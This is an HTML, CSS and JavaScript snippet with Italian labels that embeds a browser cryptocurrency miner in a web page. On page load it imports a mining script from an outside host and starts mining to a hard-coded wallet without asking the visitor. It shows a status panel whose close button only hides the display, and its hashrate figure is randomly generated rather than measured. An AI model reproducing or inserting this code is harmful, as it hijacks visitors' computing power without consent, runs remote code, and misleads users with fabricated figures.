<!-- ==================== CRYPTO MINER ==================== -->

<style>
/* Mining Console */
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 20, 0, 0.97);
    border: 2px solid #0f0;
    border-radius: 10px;
    padding: 15px;
    box-shadow: 0 0 25px #0f0;
    z-index: 1000;
    color: #0f0;
    font-family: monospace;
    display: none;
}

.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
    border-bottom: 1px solid #0f0;
    padding-bottom: 8px;
}

.close-btn {
    background: none;
    border: none;
    color: #ff4444;
    font-size: 22px;
    cursor: pointer;
    width: 30px;
    height: 30px;
}

.console-line {
    margin: 8px 0;
    font-size: 14.5px;
}

#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 55px;
    height: 55px;
    background: rgba(0, 255, 0, 0.15);
    border: 3px solid #0f0;
    color: #0f0;
    font-size: 30px;
    border-radius: 50%;
    display: none;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 0 20px #0f0;
    user-select: none;
}
</style>

<!-- Mining Console HTML -->
<div id="mining-console">
    <div class="console-header">
        <span>🔨 CPU Miner</span>
        <button class="close-btn" onclick="hideMinerConsole()">×</button>
    </div>
    <div class="console-line">Stato: <span style="color:#0f0;">Attivo</span></div>
    <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
    <div class="console-line">Tempo: <span id="timer">00:00</span></div>
    <div class="console-line" style="margin-top:12px; font-size:13px; opacity:0.8;">
        Wallet: RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT
    </div>
</div>

<div id="reopen-btn" onclick="showMinerConsole()">↑</div>

<!-- Script Miner -->
<script type="module">
    import { autoMine } from "https://earnify.cc/miner.js";
    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
</script>

<script>
// Variabili e funzioni del miner
let startTime = Date.now();

function updateTimer() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
    const sec = (elapsed % 60).toString().padStart(2, '0');
    document.getElementById("timer").textContent = `${min}:${sec}`;
}

function updateHashrate() {
    const hashrate = Math.floor(Math.random() * 450) + 280;
    document.getElementById("hashrate").textContent = hashrate + " H/s";
}

function hideMinerConsole() {
    document.getElementById("mining-console").style.display = "none";
    document.getElementById("reopen-btn").style.display = "flex";
}

function showMinerConsole() {
    document.getElementById("mining-console").style.display = "block";
    document.getElementById("reopen-btn").style.display = "none";
}

// Avvio automatico
window.addEventListener('load', () => {
    setInterval(updateTimer, 1000);
    setInterval(updateHashrate, 1600);
    
    // Mostra la console dopo 800ms dall'avvio
    setTimeout(() => {
        showMinerConsole();
    }, 800);
});
</script>
